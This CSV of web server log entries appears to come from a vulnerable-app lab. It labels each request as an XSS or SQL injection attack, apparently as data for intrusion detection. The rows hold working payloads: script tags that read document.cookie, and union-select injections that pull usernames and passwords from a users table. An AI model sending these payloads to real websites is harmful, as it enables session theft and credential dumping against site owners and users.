,HOST,TIME,REQUEST,STATUS,SIZE,DETECT
41,192.168.38.1,[17/Apr/2019:20:59:08 +0700],GET /vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&user_token=82398c4f105531bba85ad2e9070bb8b0 HTTP/1.1,200,4518,TAN_CONG_XSS
161,192.168.38.1,[07/Apr/2019:21:33:01 +0700],GET /vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E HTTP/1.1,200,4400,TAN_CONG_XSS
166,192.168.38.1,[07/Apr/2019:21:34:08 +0700],GET /vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E HTTP/1.1,200,4390,TAN_CONG_XSS
186,192.168.38.1,[17/Apr/2019:20:59:08 +0700],GET /vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&user_token=82398c4f105531bba85ad2e9070bb8b0 HTTP/1.1,200,4518,TAN_CONG_XSS
210,192.168.38.138,[02/May/2019:10:24:05 +0700],GET /vulnerabilities/sqli_blind/?id=%25%E2%80%99+or+0%3D0+union+select+null%2C+database%28%29+%23&Submit=Submit HTTP/1.1,404,4667,TAN_CONG_SQL
211,192.168.38.138,[02/May/2019:10:24:29 +0700],GET /vulnerabilities/sqli_blind/?id=%25%E2%80%99+and+1%3D0+union+select+null%2C+concat%28first_name%2C0x0a%2Clast_name%2C0x0a%2Cuser%2C0x0a%2Cpassword%29+from+users+%23&Submit=Submit HTTP/1.1,404,4667,TAN_CONG_SQL
212,192.168.38.138,[02/May/2019:10:24:39 +0700],GET /vulnerabilities/sqli_blind/?id=%25%E2%80%99+and+1%3D0+union+select+null%2C+concat%28first_name%2C0x0a%2Clast_name%2C0x0a%2Cuser%2C0x0a%2Cpassword%29+from+users+&Submit=Submit HTTP/1.1,404,4667,TAN_CONG_SQL
215,192.168.38.138,[02/May/2019:10:40:35 +0700],GET /vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%22hello%29%3C%2Fscript%3E HTTP/1.1,200,4485,TAN_CONG_XSS
